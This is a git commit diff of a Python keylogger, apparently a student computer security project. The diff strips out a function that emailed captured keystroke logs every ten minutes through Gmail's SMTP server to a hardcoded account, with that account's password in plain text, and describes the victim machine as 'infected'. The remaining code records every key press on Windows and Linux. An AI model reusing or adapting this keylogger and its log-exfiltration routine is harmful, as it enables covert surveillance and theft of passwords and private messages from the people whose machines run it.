17bdce8a37bbe09a155207014b2b69cfdca61f49
harsh-joshi-rit-2019 <47867852+harsh-joshi-rit-2019@users.noreply.github.com>
2019-04-04 17:02:09 -0400

    OS independent directory access, robust imports

--- keylogger.py
+++ keylogger.py
@@ -1,62 +1,11 @@
-import datetime
-import logging
-import os
 import platform
-import smtplib
-import time
-from email import encoders
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-
-from pynput.keyboard import Key, Listener
-
+import sys
 mySystem = platform.system()
-if mySystem == ('Linux'):
+if mySystem == 'Linux':
     import pyxhook
 
-
-starttime = time.time()
-
-# This will send the log file to the specified email account 
-# at the time interval specified.
-def sendEmail():
-    while True:
-        curDir = os.get_exec_path
-        email_user = 'csci455keylog@gmail.com'
-        email_password = 'Keylog Account!'
-        email_send = 'csci455keylog@gmail.com'
-
-        subject = 'Log from: ' + os.getcwd() + " at " + str(datetime.datetime.now())
-
-        msg = MIMEMultipart()
-        msg['From'] = email_user
-        msg['To'] = email_send
-        msg['Subject'] = subject
-
-        body = 'This email contains a key log file from an infected computer.'
-        msg.attach(MIMEText(body,'plain'))
-
-        #filename= os.getcwd() + 'key_log.txt'
-        filename = 'key_log.txt'
-        # Add log file path to open or filename
-        attachment  = open('C:/Users/harsh/Desktop/RIT/Fifth Year/Computer Security/Project/key_log.txt','rb')
-
-        part = MIMEBase('application','octet-stream')
-        part.set_payload((attachment).read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition',"attachment; filename= "+filename)
-
-        msg.attach(part)
-        text = msg.as_string()
-        server = smtplib.SMTP('smtp.gmail.com',587)
-        server.starttls()
-        server.login(email_user,email_password)
-
-
-        server.sendmail(email_user,email_send,text)
-        server.quit()
-        time.sleep(600.0 - ((time.time() - starttime) % 60.0))
+from pynput.keyboard import Key, Listener
+import logging
 
 #execute windows keylogger
 if mySystem == 'Windows':
@@ -67,9 +16,7 @@ if mySystem == 'Windows':
     def on_press(key):
         logging.info(str(key))
     with Listener(on_press=on_press) as listener:
-        sendEmail()
         listener.join()
-        
 
 #execute linux keylogger
 elif mySystem == 'Linux':
